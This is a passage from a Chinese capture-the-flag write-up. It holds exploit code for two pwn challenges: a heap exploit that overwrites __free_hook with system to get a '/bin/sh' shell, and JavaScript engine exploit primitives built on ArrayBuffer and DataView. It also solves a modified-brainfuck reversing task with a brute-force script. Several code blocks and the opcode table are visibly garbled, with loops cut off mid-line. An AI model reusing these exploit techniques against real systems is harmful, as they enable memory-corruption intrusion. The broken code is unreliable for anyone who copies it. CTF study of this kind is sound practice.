    edit(9,p64(free_hook-0x8))
    add1(0xf0) # 6
    add1(0xf0) # 10  freehook chunk
    #add1(0xf0)
    #gdb.attach(p)
    edit(10,"/bin/sh\x00"+p64(libc_base+libc.sym['system']))
    delete(10)
    p.interactive()
## Pwn -> HelloJerry
这道题只放出exp，详情参考官方WP
    function printhex(s,u){
        print(s,"0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0'));
    }
    function hex(i){
        return "0x" + i.toString(16).padStart(16, '0');
    }
    function pack64(u){
        return u[0] + u[1] * 0x100000000;
    }
    function l32(data){
        let result = 0;
        for(let i=0;i>= 8;
        }
        return result;
    }
    a = [1.1];
    a.shift();
    var ab = new ArrayBuffer(0x1337);
    var dv = new DataView(ab);
    var ab2 = new ArrayBuffer(0x2338);
    var dv2 = new DataView(ab2);
    for(let i = 0; i  ",i)
    r.sendlineafter("code> ","EOF")
    r.interactive()
## Reverse -> Press
linux下的逆向题目，通过题目附件和ida简单分析可以得到这个是一个简单的类似brainfuck的代码解释器，出题人新加了`*`,核心原理就是对一个数组dataptr的操作，魔改的brainfuck的操作码如下：  
| `>` | ++ data_ptr |  
| —— | ————————————————- |  
| `++++++++++++++++->[-]+++++++++++++++++++++->[-]+++++':
          ++idx;
          break;
        case '++++++++++++++++->[-]+++++++++++++++++++++->                                  # dataptr[2]
    [
      -                                 # dataptr[2] = 0
    ]
    +++++ (160 - flag[i])*5    return dateptr[1]
    ++                                  # (160 - flag[i])*5 + 2
    .                                   # out = (160 - flag[i])*5 + 2
    <                                   # dataptr[0]
逻辑为初始dataptr[0]+=0xa0,(dataptr[0]-flag[i])*5+2, dataptr[0] =
dataptr[1]后面flag每个字节按照这个操作，所以根据out的字节进行爆破即可：
    import base64
    s = ''
    with open('./out.back','rb') as f:
        list1 = f.read()
    for i in list1:
        print hex(ord(i)),
    print 
    d=0
    for j in list1:    
        d+=0xa0
        d=d & 0xff
        for i in range(128):
            if ((d-i)*5+2)&0xff == ord(j):
                s+=chr(i)
                d=((d-i)*5+2)&0xff
                break
    print base64.b64decode(s) 
    '''
    0x60 0xe1 0x2f 0x5 0x79 0x80 0x5e 0xe1 0xc5 0x57 0x8b 0xcc 0x5c 0x9a 0x67 0x26 0x1e 0x19 0xaf 0x93 0x3f 0x9 0xe2 0x97 0x99 0x7b 0x86 0xc1 0x25 0x87 0xd6 0xc 0xdd 0xcf 0x2a 0xf5 0x65 0xe 0x73 0x59 0x1d 0x5f 0xa4 0xf4 0x65 0x68 0xd1 0x3d 0xd2 0x98 0x5d 0xfe 0x5b 0xef 0x5b 0xcc
    flag{de0bd67e-6d25-87d7-1876-ad131a6165cb}
    '''
###  总结
这个是brainfuck语言拓展的题目，魔改的brainfuck，加深了对brainfuck语言的了解。
## 参考
  1. [官方WP](https://mp.weixin.qq.com/s/1V5BEsfdZNRKwWP1mCs8wQ)
  2. [pwnner WP](https://mp.weixin.qq.com/s/G7rDFqSb4H2HKnr0eFToJQ)
  3. [pwnner1 WP](https://mp.weixin.qq.com/s/F-1dLFlPWi2bChvif_Ao0w)
## 附件
[题目附件](https://github.com/1094093288/IMG/tree/master/Pwn/2021Sangfor)